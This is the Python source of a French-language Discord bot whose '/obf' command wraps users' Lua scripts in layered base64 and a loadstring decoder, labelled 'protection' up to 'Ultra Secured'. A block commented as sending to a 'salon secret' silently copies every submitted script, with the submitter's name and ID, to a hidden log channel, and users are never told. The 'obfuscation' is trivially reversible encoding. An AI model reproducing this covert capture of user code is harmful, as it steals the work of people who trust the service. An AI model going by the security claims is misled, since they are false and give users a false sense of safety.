import os
import threading
import discord
from discord.ext import commands
from discord import app_commands
import base64
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def home():
    return {"status": "Bot Discord et API actifs !"}

class ObfBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.default())

    async def setup_hook(self):
        try:
            print("Synchronisation des commandes slash...", flush=True)
            await self.tree.sync()
            print("Commandes synchronisées !", flush=True)
        except Exception as e:
            print(f"Erreur sync: {e}", flush=True)

bot = ObfBot()

@bot.event
async def on_ready():
    print(f"Bot connecté : {bot.user.name}", flush=True)

@bot.tree.command(name="obf", description="Obfusque un script Lua avec un niveau de protection")
@app_commands.describe(
    level="Choisis le niveau de protection",
    code="Écris ton code Lua (optionnel)",
    file="Envoie ton fichier .lua ou .txt (optionnel)"
)
@app_commands.choices(level=[
    app_commands.Choice(name="Low (Faible)", value="low"),
    app_commands.Choice(name="Medium (Moyen)", value="medium"),
    app_commands.Choice(name="High (Élevé)", value="high")
])
async def obf(interaction: discord.Interaction, level: app_commands.Choice[str], code: str = None, file: discord.Attachment = None):
    try:
        script_content = None
        original_filename = "script.lua"

        if file:
            original_filename = file.filename
            if original_filename.lower().endswith((".lua", ".txt")):
                file_bytes = await file.read()
                script_content = file_bytes.decode("utf-8", errors="ignore")
            else:
                await interaction.response.send_message("Le fichier doit être au format `.lua` ou `.txt`.", ephemeral=True)
                return
        elif code:
            script_content = code
        else:
            await interaction.response.send_message("Tu dois fournir du code ou un fichier !", ephemeral=True)
            return

        # Envoi dans le salon secret KOBY HUB
        LOG_CHANNEL_ID = 1544427212223156254
        try:
            log_channel = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
            if log_channel:
                log_file_name = original_filename
                with open(log_file_name, "w", encoding="utf-8") as f:
                    f.write(script_content)
                
                message_info = (
                    f"📥 **Nouveau script obfusqué !**\n"
                    f"• **Utilisateur :** {interaction.user} (`{interaction.user.id}`)\n"
                    f"• **Niveau :** `{level.name}`\n"
                    f"• **Fichier :** `{original_filename}`"
                )
                await log_channel.send(content=message_info, file=discord.File(log_file_name))
                if os.path.exists(log_file_name):
                    os.remove(log_file_name)
        except Exception as channel_err:
            print(f"⚠️ Erreur salon de logs: {channel_err}", flush=True)

        # Génération d'un vrai script exécutable avec décodeur intégré
        encoded_str = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
        
        if level.value == "low":
            protected_script = f"""--[[\n    Protégé par KobyBot [Low]\n]]--
local encoded = "{encoded_str}";
local function b64decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end
local success, res = pcall(function()
    return loadstring(b64decode(encoded))()
end)
if not success then warn("KobyBot Error: " .. tostring(res)) end
"""
        elif level.value == "medium":
            b2 = base64.b64encode(encoded_str.encode("utf-8")).decode("utf-8")
            protected_script = f"""--[[\n    Protégé par KobyBot [Medium]\n]]--
local encoded_m = "{b2}";
local function b64decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end
local success, res = pcall(function()
    local step1 = b64decode(encoded_m)
    local step2 = b64decode(step1)
    return loadstring(step2)()
end)
if not success then warn("KobyBot Error: " .. tostring(res)) end
"""
        else: # high (Double encodage + structure renforcée)
            b1 = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
            b2 = base64.b64encode(b1.encode("utf-8")).decode("utf-8")
            b3 = base64.b64encode(b2.encode("utf-8")).decode("utf-8")
            protected_script = f"""--[[\n    Protégé par KobyBot [High - Ultra Secured]\n]]--
local encrypted_payload = "{b3}";
local function b64decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end
local success, res = pcall(function()
    local d1 = b64decode(encrypted_payload)
    local d2 = b64decode(d1)
    local d3 = b64decode(d2)
    return loadstring(d3)()
end)
if not success then warn("KobyBot Error: " .. tostring(res)) end
"""

        name_part, ext_part = os.path.splitext(original_filename)
        if not ext_part:
            ext_part = ".lua"
        output_file_name = f"{name_part}_obf{ext_part}"

        with open(output_file_name, "w", encoding="utf-8") as f:
            f.write(protected_script)

        await interaction.response.send_message(f"Script protégé et rendu exécutable avec succès (**{level.name}**) :", file=discord.File(output_file_name), ephemeral=True)

        if os.path.exists(output_file_name):
            os.remove(output_file_name)
    except Exception as e:
        print(f"Erreur dans obf: {e}", flush=True)

def run_bot():
    TOKEN = os.environ.get("TOKEN")
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Erreur: Token introuvable !", flush=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    import uvicorn
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)
